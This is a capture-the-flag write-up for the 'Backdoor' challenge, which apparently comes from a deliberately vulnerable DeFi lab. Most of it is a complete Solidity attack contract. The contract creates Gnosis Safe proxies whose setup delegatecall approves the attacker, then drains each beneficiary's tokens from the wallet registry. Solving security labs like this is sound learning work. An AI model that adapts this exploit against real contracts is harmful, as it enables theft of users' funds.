# Challenge #11 - Backdoor

To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Gnosis Safe wallets. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.

To make sure everything is safe and sound, the registry tightly integrates with the legitimate Gnosis Safe Proxy Factory, and has some additional safety checks.

Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.

Your goal is to take all funds from the registry. In a single transaction.

# Solution

In order to succeed you will need to be familiar with how Gnosis wallets work. You have a ProxyFactory that will create a GnosisSafe proxies contracts following a certain GnosisSafe model (singleton).
The trick here is to use the the modules of the proxy contract as a backdoor.
At setup you are able to set up modules that will call other contracts (Attack contract below) using delegatecall. From there it is easy to have the GnosisSafe contract do whatever you want it to.

```
contract Attack {
    IProxyCreationCallback private walletRegistry;
    address private proxyFactory;
    address private gnosisSafe;
    address private attacker;
    DamnValuableToken private token;

    constructor(
        address _walletRegistry,
        address _proxyFactory,
        address _gnosisSafe,
        address _attacker,
        address _token
    ) {
        walletRegistry = IProxyCreationCallback(_walletRegistry);
        proxyFactory = _proxyFactory;
        gnosisSafe = _gnosisSafe;
        attacker = _attacker;
        token = DamnValuableToken(_token);
    }

    //function will be called at setup from GnosisSafe proxy contract using deletegate call
    function approveToken(address addressToken, address attackerContract)
        public
    {
        uint256 balance = DamnValuableToken(addressToken).balanceOf(msg.sender);
        (bool result, bytes memory error) = addressToken.call(
            abi.encodeWithSignature(
                "approve(address,uint256)",
                attackerContract,
                10 ether
            )
        );
    }

    function attack(address[] calldata users) public {
        for (uint256 i = 0; i < users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];
            //function that we will have the module call at setup
            bytes memory transferFunc = abi.encodeWithSignature(
                "approveToken(address,address)",
                address(token),
                address(this)
            );
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(this),
                transferFunc,
                address(0),
                0,
                address(0)
            );
            //deploy proxy contract and have callback call proxycCreated() from WalletRegistry contract
            GnosisSafeProxy proxy = GnosisSafeProxyFactory(proxyFactory)
                .createProxyWithCallback(
                    gnosisSafe,
                    initializer,
                    i,
                    walletRegistry
                );
            //transfer the 10 tokens that were approved at set up
            token.transferFrom(address(proxy), attacker, 10 ether);
        }
    }
}
```
